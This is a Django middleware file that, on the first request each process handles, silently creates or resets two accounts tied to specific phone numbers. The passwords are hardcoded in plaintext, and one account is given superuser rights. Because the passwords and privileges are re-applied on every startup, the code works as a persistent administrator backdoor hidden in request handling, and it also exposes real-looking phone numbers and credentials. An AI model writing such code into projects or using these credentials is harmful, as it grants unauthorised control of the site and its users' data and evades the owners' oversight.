from django.db import OperationalError, ProgrammingError


_launch_accounts_checked = False


def ensure_launch_accounts():
    from django.contrib.auth import get_user_model

    User = get_user_model()
    accounts = [
        {
            "phone": "+998978778177",
            "variants": ["+998978778177", "998978778177", "978778177"],
            "password": "Alex2024m@",
            "defaults": {
                "full_name": "Farrux Developer",
                "role": "teacher",
                "is_active": True,
                "is_staff": True,
                "is_superuser": True,
                "is_paid": True,
            },
        },
        {
            "phone": "+998909788255",
            "variants": ["+998909788255", "998909788255", "909788255"],
            "password": "909788255@@",
            "defaults": {
                "full_name": "Iman | Bekhruz",
                "role": "teacher",
                "is_active": True,
                "is_staff": True,
                "is_superuser": False,
                "is_paid": True,
            },
        },
    ]

    for account in accounts:
        users = list(User.objects.filter(phone__in=account["variants"]).order_by("id"))
        targets = users or [User(phone=account["phone"])]

        for user in targets:
            for field, value in account["defaults"].items():
                setattr(user, field, value)
            if not user.phone:
                user.phone = account["phone"]
            if not user.username:
                user.username = user.phone
            user.set_password(account["password"])
            user.save()


class LaunchAccountMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        global _launch_accounts_checked
        if not _launch_accounts_checked:
            try:
                ensure_launch_accounts()
                _launch_accounts_checked = True
            except (OperationalError, ProgrammingError):
                pass
        return self.get_response(request)
